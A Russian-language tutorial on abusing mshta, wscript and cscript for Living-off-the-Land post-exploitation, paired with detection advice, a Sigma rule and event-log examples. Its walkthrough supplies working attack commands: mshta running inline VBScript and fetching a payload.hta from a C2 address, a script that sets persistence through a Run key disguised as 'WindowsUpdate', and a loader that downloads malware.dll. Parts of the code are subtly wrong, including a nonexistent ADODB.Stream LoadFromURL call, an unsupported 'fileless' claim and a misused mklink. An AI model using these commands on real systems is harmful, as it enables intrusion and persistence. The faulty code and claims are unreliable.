# Исполнение скриптов через mshta, wscript и cscript: Living-off-the-Land в пост-эксплуатации

## Контекст и базовые понятия: Living-off-the-Land и скриптовые движки Windows

Living-off-the-Land (LOTL) — это тактика кибератак, при которой злоумышленники используют легитимные системные утилиты, скрипты и библиотеки, уже присутствующие в целевой среде, для выполнения вредоносных действий. В отличие от традиционного внедрения вредоносного ПО (malware), LOTL-атаки не требуют загрузки внешних исполняемых файлов, что существенно снижает цифровой след и затрудняет обнаружение средствами антивирусной защиты, ориентированными на сигнатурный анализ. Ключевая особенность LOTL заключается в злоупотреблении доверенными компонентами операционной системы, которые администраторы считают безопасными по умолчанию.

В контексте Windows-инфраструктуры основными инструментами для выполнения скриптов выступают три компонента: `mshta.exe`, `wscript.exe` и `cscript.exe`. Несмотря на то, что все они предназначены для интерпретации скриптов, их архитектурное назначение, контексты выполнения и механизмы взаимодействия с операционной системой различаются. Понимание этих различий критически важно как для проведения тестирования на проникновение (для оценки реального риска), так и для построения систем мониторинга (для выявления аномалий).

`mshta.exe` (Microsoft HTML Application Host) изначально предназначен для запуска файлов HTML Applications (HTA). HTA — это исполняемые файлы, которые позволяют веб-технологиям (HTML, CSS, JavaScript, VBScript) работать как нативным десктопным приложениям, минуя ограничения безопасности браузера (например, Same-Origin Policy). В контексте пост-эксплуатации `mshta.exe` ценится за возможность выполнения произвольного кода (JScript или VBScript) как из локального файла, так и из удаленного URL, а также за способность запускать дочерние процессы с правами текущего пользователя.

`wscript.exe` (Windows Script Host) и `cscript.exe` (Console-based Windows Script Host) являются оболочками для выполнения скриптов на языках VBScript и JScript. Различие между ними заключается в интерфейсе: `wscript.exe` использует графический интерфейс (GUI) для вывода сообщений и запросов, тогда как `cscript.exe` использует консоль (stdin/stdout). Оба процесса являются частью Windows Script Host (WSH) — подсистемы, позволяющей скриптам взаимодействовать с объектной моделью Windows (файловая система, реестр, COM-объекты). В современной пост-эксплуатации `wscript.exe` часто предпочтительнее для скрытности (отсутствие консольного окна), а `cscript.exe` — для отладки или вывода результатов в лог.

Для предотвращения путаницы необходимо четко разграничивать понятия, часто встречающиеся в литературе по LOTL:

| Сущность | Назначение | Контекст выполнения | Роль в LOTL |
| :--- | :--- | :--- | :--- |
| **LOLBIN** | Легитимный исполняемый файл (PE), имеющий функционал, отличный от основного назначения. | Процесс Windows, запущенный через `cmd.exe` или напрямую. | `mshta.exe`, `regsvr32.exe`, `certutil.exe`. Используются для прокси-исполнения кода. |
| **LOLScript** | Скриптовый файл (VBS, JS, PS1), использующий легитимные API Windows. | Интерпретируется хостом (WSH, PowerShell, IE). | `payload.vbs`, `invoke-mimikatz.ps1`. Содержат логику атаки. |
| **Fileless Malware** | Вредоносный код, выполняемый исключительно в памяти без записи на диск. | Любой контекст (регистрация, COM, WMI). | `mshta` может быть вектором доставки fileless-кода в память. |
| **Scripting Host** | Подсистема ОС, предоставляющая API для скриптов. | Системный сервис. | `wscript.exe`/`cscript.exe` — реализации WSH. |

Ключевое разграничение: `mshta.exe` — это отдельный бинарный файл (LOLBIN), который *интерпретирует* HTA-контент. `wscript.exe`/`cscript.exe` — это *хосты* для скриптов VBS/JS. Злоумышленники могут использовать `mshta` для запуска `wscript` или напрямую выполнять код, а могут использовать `wscript` для загрузки и выполнения других скриптов. Все три инструмента относятся к технике MITRE ATT&CK **T1216 (Signed Script Proxy Execution)** и **T1218 (Signed Binary Proxy Execution)**, так как они подписаны Microsoft и легитимны.

## Внутреннее устройство: Архитектура и механизмы исполнения

### mshta.exe: HTML Application Host и обход ограничений

`mshta.exe` является частью Internet Explorer (IE) и использует движок MSHTML (Trident) для рендеринга и выполнения кода. Архитектурно он позволяет скриптам иметь полный доступ к объектной модели Windows (WScript.Shell, Scripting.FileSystemObject, ActiveX-компоненты), что недоступно обычным веб-страницам в браузере из-за песочницы.

**Механизм исполнения:**
1.  Запуск `mshta.exe` с аргументом, указывающим на HTA-файл или URL.
2.  Загрузка контента (локально или по HTTP/HTTPS).
3.  Парсинг HTML-структуры. Если в теле документа есть теги `<script>`, код выполняется в контексте HTA.
4.  Предоставление скрипту доступа к COM-объектам через `ActiveXObject` (JScript) или `CreateObject` (VBScript).

**Ключевые особенности для пост-эксплуатации:**
*   **Выполнение удаленного кода:** `mshta` может загружать скрипт напрямую из интернета, что позволяет атаке быть "fileless" на этапе выполнения (хотя сетевой трафик будет виден).
*   **Обход Application Whitelisting:** Поскольку `mshta.exe` является системным файлом, он часто исключен из списков блокировки (AppLocker, WDAC).
*   **Смешивание кода:** В HTA можно смешивать HTML, CSS, JScript и VBScript, что усложняет статический анализ.

**Иллюстративная схема процесса mshta:**
```text
[Пользователь/Атакующий]
       │
       ▼
[cmd.exe / powershell.exe] ──(аргумент: URL или путь к .hta)──▶ [mshta.exe]
       │                                                                 │
       │                                                                 ├──▶ Загрузка HTA-контента (HTTP/HTTPS или FS)
       │                                                                 │
       │                                                                 ├──▶ Парсинг DOM (MSHTML)
       │                                                                 │
       │                                                                 └──▶ Исполнение <script> (JScript/VBScript)
       │                                                                             │
       │                                                                             ├──▶ CreateObject("WScript.Shell")
       │                                                                             ├──▶ CreateObject("Scripting.FileSystemObject")
       │                                                                             └──▶ ActiveX (например, Shell.Application)
```

### wscript.exe и cscript.exe: Windows Script Host (WSH)

`wscript.exe` и `cscript.exe` являются оболочками для Windows Script Host. WSH — это инфраструктура, позволяющая скриптам на языках VBScript и JScript взаимодействовать с операционной системой.

**Внутренняя структура WSH:**
*   **Host Executable:** `wscript.exe` (GUI) или `cscript.exe` (Console).
*   **Scripting Engine:** Движок интерпретации (например, `vbscript.dll` для VBScript, `jscript.dll` для JScript).
*   **Object Model:** Набор COM-объектов, доступных скрипту (WScript, Shell, Network, FileSystemObject, Adodb.Stream).

**Различия в поведении:**
*   `wscript.exe`: Использует `msgbox` для вывода сообщений. Не выводит ошибки в консоль по умолчанию. Запускается в фоне, если нет GUI-запросов.
*   `cscript.exe`: Выводит все сообщения и ошибки в стандартный поток вывода (stdout). Требует явного указания `WScript.Echo` для вывода данных.

**Механизм исполнения скрипта:**
1.  Запуск хоста с указанием файла скрипта (`.vbs` или `.js`).
2.  Загрузка файла в память.
3.  Инициализация движка скрипта.
4.  Последовательное выполнение инструкций.
5.  Доступ к COM-объектам через `WScript.CreateObject` или `new ActiveXObject`.

**Ключевые объекты для пост-эксплуатации:**
*   `WScript.Shell`: Выполнение команд (`Run`, `Exec`), работа с реестром (`RegRead`, `RegWrite`), создание ярлыков.
*   `Scripting.FileSystemObject`: Чтение/запись файлов, навигация по директориям.
*   `Adodb.Stream`: Загрузка бинарных данных в память (используется для загрузки DLL или исполняемых файлов в память без записи на диск).
*   `WinHttp.WinHttpRequest`: Выполнение HTTP-запросов (аналог `curl` или `Invoke-WebRequest`).

**Сравнительная таблица скриптовых движков:**

| Параметр | mshta.exe | wscript.exe | cscript.exe |
| :--- | :--- | :--- | :--- |
| **Основной формат** | HTA (HTML + JS/VB) | VBS, JS | VBS, JS |
| **Интерфейс** | Окно приложения (GUI) | Фоновое окно / GUI | Консоль (CLI) |
| **Доступ к DOM** | Да (через MSHTML) | Нет | Нет |
| **COM-объекты** | ActiveXObject / CreateObject | WScript.CreateObject | WScript.CreateObject |
| **Сетевые возможности** | XMLHTTP, WinHttpRequest | WinHttpRequest | WinHttpRequest |
| **Типичный вектор** | Загрузка удаленного HTA | Локальный VBS-скрипт | Локальный VBS-скрипт |
| **Логирование** | Event ID 4688 (Process Create) | Event ID 4688 | Event ID 4688 |

## Применение и работа с предметом: Техники эксплуатации и детекции

### Техники эксплуатации mshta.exe

В пост-эксплуатации `mshta.exe` используется для выполнения кода в обход ограничений. Наиболее распространенные техники включают:

1.  **Выполнение inline-кода:** Передача скрипта напрямую в командной строке. Это позволяет избежать создания файлов на диске.
    *   *Пример:* Запуск VBScript для создания объекта `WScript.Shell` и выполнения команды.
    *   *Ограничение:* Длинные строки могут быть обрезаны или вызвать ошибки парсинга в зависимости от оболочки.

2.  **Загрузка удаленного HTA:** Скрипт загружается с C2-сервера. Это усложняет анализ, так как статический анализ не видит вредоносного кода.
    *   *Пример:* `mshta http://<C2>/payload.hta`

3.  **Обфускация:** Использование Unicode-перекодировок, конкатенации строк или Base64-кодирования для скрытия полезной нагрузки.

**Пример команды для inline-выполнения (VBScript):**
```powershell
# Выполнение команды whoami через mshta с использованием VBScript
mshta vbscript:CreateObject("WScript.Shell").Run("cmd /c whoami", 0, True)(window.close)
```
*Пояснение:* `vbscript:` указывает на тип содержимого. `CreateObject("WScript.Shell")` создает объект оболочки. `.Run("cmd /c whoami", 0, True)` запускает команду `whoami` в скрытом окне (`0`) и ждет завершения (`True`). `(window.close)` закрывает окно mshta после выполнения.

**Пример команды для загрузки удаленного HTA:**
```powershell
# Загрузка и выполнение HTA с удаленного сервера
mshta http://192.168.1.100:8080/payload.hta
```

### Техники эксплуатации wscript.exe и cscript.exe

Скрипты VBS/JScript часто используются для:
1.  **Создания persistence:** Добавление записей в реестр (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
2.  **Загрузки полезных нагрузок:** Использование `Adodb.Stream` для загрузки бинарных данных в память.
3.  **Lateral Movement:** Использование `WScript.Network` для подключения к сетевым ресурсам или выполнения команд на удаленных машинах через WMI.

**Пример скрипта VBS для persistence:**
```vbscript
' Сохранение как persistence.vbs
Set objShell = CreateObject("WScript.Shell")
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater", "C:\Windows\System32\wscript.exe C:\temp\payload.vbs", "REG_SZ"
```

**Пример скрипта VBS для загрузки в память (Adodb.Stream):**
```vbscript
' Сохранение как loader.vbs
Dim objStream
Set objStream = CreateObject("Adodb.Stream")
objStream.Type = 1 ' adTypeBinary
objStream.Open
objStream.LoadFromURL "http://192.168.1.100:8080/malware.dll"
' Дальнейшее выполнение через ActiveX или запись на диск
```

### Детекция и мониторинг

Для обнаружения злоупотребления этими инструментами необходимо мониторить:
1.  **События создания процессов (Event ID 4688):** Мониторинг родительских процессов. Запуск `mshta`, `wscript`, `cscript` из `explorer.exe` или `outlook.exe` является аномалией.
2.  **Сетевые подключения:** `mshta.exe` и скрипты, использующие `WinHttpRequest`, могут инициировать исходящие соединения.
3.  **Изменения реестра:** Записи в ключи автозагрузки.
4.  **Поведение скриптов:** Использование `ActiveXObject`, `CreateObject`, `Adodb.Stream`.

**Пример правила Sigma для обнаружения inline-выполнения через mshta:**
```yaml
title: Detection of mshta.exe Inline Execution
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detects potential LOTL execution via mshta.exe with inline VBScript/JScript
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\mshta.exe'
        CommandLine|contains:
            - 'vbscript:'
            - 'javascript:'
            - 'http://'
            - 'https://'
    condition: selection
falsepositives:
    - Legitimate HTA applications
    - Admin scripts
level: high
```

## Сквозной практический пример: Пост-эксплуатация через mshta и wscript

### Исходные условия
*   **Среда:** Windows 10/11, полностью обновленная.
*   **Роль:** Пентестер, имеющий доступ к командной строке на скомпрометированной машине (через RDP или shell).
*   **Цель:** Выполнить произвольную команду (`whoami`) и загрузить файл с C2-сервера в память, используя только встроенные инструменты.
*   **Инструменты:** `mshta.exe`, `wscript.exe`, локальный HTTP-сервер (например, Python `http.server` или Netcat).

### Шаг 1: Выполнение команды через mshta.exe (Inline VBScript)

**Действие:** Запуск команды `whoami` в фоновом режиме с использованием `mshta.exe` и inline-VBScript.

**Артефакт (команда):**
```powershell
mshta vbscript:CreateObject("WScript.Shell").Run("cmd /c whoami > C:\temp\result.txt", 0, True)(window.close)
```

**Ожидаемый вывод:**
*   Окно `mshta.exe` появляется и мгновенно закрывается.
*   В файле `C:\temp\result.txt` появляется результат выполнения `whoami` (например, `DESKTOP-ABC123\user`).
*   В Event Viewer (Security Log) регистрируется событие 4688: `New Process Name: C:\Windows\System32\mshta.exe`, Parent: `cmd.exe` или `powershell.exe`.

### Шаг 2: Создание persistence через wscript.exe

**Действие:** Добавление записи в реестр для автоматического запуска скрипта при входе пользователя.

**Артефакт (скрипт payload.vbs):**
```vbscript
' Сохранить как C:\temp\payload.vbs
Set objShell = CreateObject("WScript.Shell")
' Добавляем запись в HKCU\Run
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", "C:\Windows\System32\wscript.exe C:\temp\payload.vbs", "REG_SZ"
' Также создаем ярлык в Startup
objShell.Run "mklink C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk C:\temp\payload.vbs", 0, True
```

**Артефакт (команда запуска):**
```powershell
wscript.exe C:\temp\payload.vbs
```

**Ожидаемый вывод:**
*   Скрипт выполняется без вывода в консоль (так как используется `wscript`).
*   В реестре `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` появляется ключ `WindowsUpdate` со значением, указывающим на `wscript.exe`.
*   В папке Startup создается ярлык.
*   При следующем входе пользователя скрипт выполнится автоматически.

### Шаг 3: Загрузка файла в память через cscript.exe и Adodb.Stream

**Действие:** Загрузка бинарного файла (например, DLL) с C2-сервера в память без записи на диск.

**Артефакт (скрипт loader.vbs):**
```vbscript
' Сохранить как C:\temp\loader.vbs
Dim objStream
Set objStream = CreateObject("Adodb.Stream")
objStream.Type = 1 ' adTypeBinary
objStream.Open
' Загрузка с локального HTTP-сервера (замените IP на свой)
objStream.LoadFromURL "http://192.168.1.100:8080/malware.dll"
' Чтение данных в массив
Dim data
data = objStream.Read
' Дальнейшее выполнение через ActiveX (например, через Shell.Application или другой механизм)
' Для примера просто выводим размер загруженных данных
WScript.Echo "Loaded " & objStream.Size & " bytes"
objStream.Close
```

**Артефакт (команда запуска):**
```powershell
cscript.exe //nologo C:\temp\loader.vbs
```

**Ожидаемый вывод:**
*   В консоли выводится размер загруженных данных (например, `Loaded 45056 bytes`).
*   Файл `malware.dll` не появляется на диске.
*   В сетевых логах видно исходящее HTTP-запрос от `cscript.exe` к `192.168.1.100`.

### Шаг 4: Анализ логов и детекция

**Действие:** Проверка Event Viewer и SIEM на наличие аномалий.

**Артефакт (фрагмент Event ID 4688):**
```xml
<EventData>
    <Data Name="SubjectUserSid">S-1-5-21-...</Data>
    <Data Name="SubjectUserName">user</Data>
    <Data Name="SubjectDomainName">DESKTOP-ABC123</Data>
    <Data Name="ProcessId">0x1234</Data>
    <Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data>
    <Data Name="CommandLine">vbscript:CreateObject("WScript.Shell").Run("cmd /c whoami", 0, True)(window.close)</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
</EventData>
```

**Ожидаемый вывод:**
*   Аномалия: `mshta.exe` запущен с аргументом `vbscript:`.
*   Аномалия: Родительский процесс `cmd.exe` запускает `mshta.exe` с нестандартным аргументом.
*   Детекция: Правило Sigma, приведенное выше, должно сработать.

### Ожидаемый вывод
Пример демонстрирует, как злоумышленник может выполнить код, создать persistence и загрузить данные, используя только легитимные системные утилиты. Все действия оставляют следы в логах событий Windows, но не требуют загрузки внешнего вредоносного ПО. Для защиты необходимо мониторить создание процессов `mshta`, `wscript`, `cscript` и их аргументы, а также использовать Application Whitelisting.

## Аналитический вывод

Использование `mshta.exe`, `wscript.exe` и `cscript.exe` в пост-эксплуатации представляет собой классический пример атаки Living-off-the-Land. Эти инструменты легитимны, подписаны Microsoft и присутствуют во всех современных версиях Windows, что делает их идеальными векторами для обхода сигнатурной защиты. Ключевая угроза заключается не в самих бинарных файлах, а в их способности интерпретировать произвольный код (VBScript, JScript, HTA) и взаимодействовать с COM-объектами Windows.

Для специалистов по безопасности критически важно понимать, что традиционные методы защиты (антивирусы, файрволы) часто неэффективны против LOTL-атак. Вместо этого необходимо внедрять поведенческий мониторинг, анализ родительско-детских связей процессов и Application Whitelisting. Мониторинг событий создания процессов (Event ID 4688) с фильтрацией по аргументам командной строки является первым шагом в обнаружении злоупотребления этими инструментами. Кроме того, отключение или ограничение использования Windows Script Host и HTML Application Host там, где это не требуется для бизнес-процессов, является эффективным методом снижения поверхности атаки.

## Источники

1.  [Living off the Land: How attackers hide in legitimate tools - Vectra AI](https://www.vectra.ai/topics/living-off-the-land)
2.  [Systematic Analysis of Windows Malware Living-Off-The-Land - Vanderbilt University](https://cumberland.isis.vanderbilt.edu/cs6380-sp25/content/p2-opt-off-land.pdf)
3.  [Living off the Land and Fileless Malware - ReliaQuest](https://reliaquest.com/blog/living-off-the-land-fileless-malware/)
4.  [Monitoring and Testing for Living-Off-the-Land Binaries - AttackIQ](https://www.attackiq.com/2023/03/16/hiding-in-plain-sight/)
5.  [Identifying and Mitigating Living Off the Land Techniques - CISA](https://www.cisa.gov/sites/default/files/2025-03/Joint-Guidance-Identifying-and-Mitigating-LOTL508.pdf)
6.  [PeckBirdy Exposes a New Living off the Land Threat - CyberSec Sentinel](https://cybersecsentinel.com/peckbirdy-exposes-a-new-living-off-the-land-threat/)
7.  [Living Off The Land (LOTL) Attacks and Techniques - Fortinet](https://www.fortinet.com/resources/cyberglossary/living-off-the-land-lotl)
8.  [Living off the Land (LOTL) Attacks and Techniques - Infopercept](https://www.infopercept.com/blogs/living-off-the-land-attacks-how-adversaries-weaponize-your-systems-4tiao)
9.  [What Is Mshta, How Can It Be Used and How to Protect Against It - McAfee](https://www.mcafee.com/learn/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/)
10. [What Is Living Off the Land (LOTL) in Cybersecurity? - DeepStrike](https://deepstrike.io/blog/living-off-the-land-lotl)